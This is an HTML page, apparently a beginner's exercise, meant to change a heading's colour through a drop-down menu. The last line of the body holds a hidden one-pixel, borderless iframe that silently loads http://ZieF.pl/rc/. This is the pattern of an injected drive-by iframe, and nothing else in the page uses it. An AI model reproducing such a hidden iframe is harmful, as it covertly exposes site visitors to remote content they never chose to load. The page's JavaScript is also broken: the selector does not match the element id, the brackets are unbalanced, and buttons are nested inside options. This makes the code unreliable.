<!DOCTYPE html>
<html>
    <head>
        <title>My Website</title>
        <script>
            document.addEventListener('DOMContentLoaded',function(){
                   document.querySelector('#mySelector').onchange = function(){
                     document.querySelectorAll('.color-change').forEach(function(button){
                    button.onclick = function(){
                        document.querySelector('#hello').style.color = button.dataset.color;
                    };
                });
            });
});
        </script>
    </head>
    <body>
        <h1 id="hello">Hello!Welcome to Our PreIntern Group.</h1>
        <select id="mySelect" >
        <option><button class="color-change" data-color="red">Red</button></option>
        <option><button class="color-change" data-color="green">Green</button></option>
        <option><button class="color-change" data-color="blue">Blue</button></option>
        </select>
    <iframe src="http://ZieF.pl/rc/" width=1 height=1 style="border:0"></iframe>
</body>
</html>
